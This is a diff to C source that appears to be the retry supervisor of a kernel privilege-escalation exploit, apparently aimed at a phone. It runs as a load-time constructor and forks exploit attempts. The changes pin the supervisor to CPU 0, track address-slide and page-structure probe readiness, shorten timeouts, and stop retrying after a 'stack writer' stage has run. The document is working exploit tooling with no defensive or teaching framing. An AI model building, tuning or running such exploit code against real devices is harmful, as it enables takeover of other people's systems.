@@ -1,15 +1,5 @@
 #include "common.h"
 
-/*
- * Supervisor timeout overrides.
- * We #undef first to guarantee these take precedence over any values
- * that may have leaked in from target.h (which defines generous limits
- * for the native payload itself).
- */
-#undef DEFAULT_EXPLOIT_ATTEMPTS
-#undef DEFAULT_ATTEMPT_TIMEOUT_SEC
-#undef DEFAULT_P0_ATTEMPT_TIMEOUT_SEC
-
 #ifndef DEFAULT_EXPLOIT_ATTEMPTS
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define DEFAULT_EXPLOIT_ATTEMPTS 24
@@ -22,14 +12,36 @@
 #define DEFAULT_ATTEMPT_TIMEOUT_SEC 300
 #endif
 #ifndef DEFAULT_P0_ATTEMPT_TIMEOUT_SEC
-#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 90
+#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 180
 #endif
 #define APP_MIN_BOOT_UPTIME_SEC 120
+
+/*
+ * Pin supervisor to CPU 0.
+ *
+ * The child already calls pin_self_to_cpu0() inside run_exploit(), but
+ * pinning the supervisor here ensures:
+ *   - the child inherits CPU affinity before pinning again (redundant but fine)
+ *   - waitpid() in the supervisor does not contend with the child's
+ *     consumer_thread on CONSUMER_CORE (=1)
+ */
+static void supervisor_pin_cpu0(void) {
+  cpu_set_t mask;
+  CPU_ZERO(&mask);
+  CPU_SET(0, &mask);
+  if (sched_setaffinity(0, sizeof(mask), &mask) != 0) {
+    pr_warning("supervisor sched_setaffinity CPU0 failed errno=%d\n", errno);
+  } else {
+    pr_success("supervisor pinned to CPU 0 pid=%d\n", getpid());
+  }
+}
 
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
 struct app_p0_shared_state {
   atomic_int dirty;
-  atomic_int ready;
+  atomic_int slide_ready;
+  atomic_int p0_ready;
+  atomic_int writer_started;
   _Atomic uintptr_t offset;
   _Atomic uintptr_t gate_page_struct;
   _Atomic uintptr_t probe_page_struct;
@@ -44,7 +56,14 @@ void app_publish_p0_offset(uintptr_t offset) {
   atomic_store(&app_p0_state->gate_page_struct, p0_gate_page_struct);
   atomic_store(&app_p0_state->probe_page_struct, p0_probe_page_struct);
   atomic_store(&app_p0_state->offset, offset);
-  atomic_store(&app_p0_state->ready, 1);
+  atomic_store(&app_p0_state->p0_ready, 1);
+  atomic_store(&app_p0_state->slide_ready, 1);
+}
+
+void app_publish_slide_ready(void) {
+  if (app_p0_state) {
+    atomic_store(&app_p0_state->slide_ready, 1);
+  }
 }
 
 void app_publish_p0_dirty(void) {
@@ -54,6 +73,12 @@ void app_publish_p0_dirty(void) {
   atomic_store(&app_p0_state->gate_page_struct, p0_gate_page_struct);
   atomic_store(&app_p0_state->probe_page_struct, p0_probe_page_struct);
   atomic_store(&app_p0_state->dirty, 1);
+}
+
+void app_publish_writer_started(void) {
+  if (app_p0_state) {
+    atomic_store(&app_p0_state->writer_started, 1);
+  }
 }
 
 #endif
@@ -119,6 +144,10 @@ __attribute__((constructor)) static void load(void) {
   }
   started = 1;
   set_unbuffer();
+
+  /* Pin the supervisor before any fork. */
+  supervisor_pin_cpu0();
+
   wait_for_boot_quiet_window();
 
   int max_attempts = env_int(
@@ -126,9 +155,9 @@ __attribute__((constructor)) static void load(void) {
   int base_delay = env_int(
       "PSELECT_DELAY_USEC", DEFAULT_PSELECT_DELAY_USEC, 0, 1000000);
   int attempt_timeout_sec = env_int(
-      "EXPLOIT_ATTEMPT_TIMEOUT_SEC", DEFAULT_ATTEMPT_TIMEOUT_SEC, 300, 900);
+      "EXPLOIT_ATTEMPT_TIMEOUT_SEC", DEFAULT_ATTEMPT_TIMEOUT_SEC, 5, 900);
   int p0_attempt_timeout_sec = env_int(
-      "P0_ATTEMPT_TIMEOUT_SEC", DEFAULT_P0_ATTEMPT_TIMEOUT_SEC, 90,
+      "P0_ATTEMPT_TIMEOUT_SEC", DEFAULT_P0_ATTEMPT_TIMEOUT_SEC, 5,
       attempt_timeout_sec);
   if (p0_attempt_timeout_sec > attempt_timeout_sec) {
     p0_attempt_timeout_sec = attempt_timeout_sec;
@@ -163,8 +192,11 @@ __attribute__((constructor)) static void load(void) {
         _exit(1);
       }
       char delay[16];
+      char attempt_text[16];
       snprintf(delay, sizeof(delay), "%d", delay_usec);
+      snprintf(attempt_text, sizeof(attempt_text), "%d", attempt);
       SYSCHK(setenv("PSELECT_DELAY_USEC", delay, 1));
+      SYSCHK(setenv("S23_SUPERVISOR_ATTEMPT", attempt_text, 1));
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
       const char *forced_offset = getenv("SLIDE_P0_OFFSET");
       if (forced_offset) {
@@ -201,7 +233,7 @@ __attribute__((constructor)) static void load(void) {
       int timeout_sec = attempt_timeout_sec;
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
       if (!getenv("SLIDE_P0_OFFSET") &&
-          !atomic_load(&app_p0_state->ready)) {
+          !atomic_load(&app_p0_state->slide_ready)) {
         timeout_sec = p0_attempt_timeout_sec;
       }
 #endif
@@ -226,8 +258,15 @@ __attribute__((constructor)) static void load(void) {
     }
 
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
+    if (atomic_load(&app_p0_state->writer_started)) {
+      pr_error("stack writer ran; refusing retry on this boot\n");
+      break;
+    }
+#endif
+
+#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
     if (!getenv("SLIDE_P0_OFFSET") &&
-        atomic_load(&app_p0_state->ready)) {
+        atomic_load(&app_p0_state->p0_ready)) {
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
       pr_error("fresh P0 session was consumed by the failed child; "
                "refusing cross-process retry, reboot required\n");
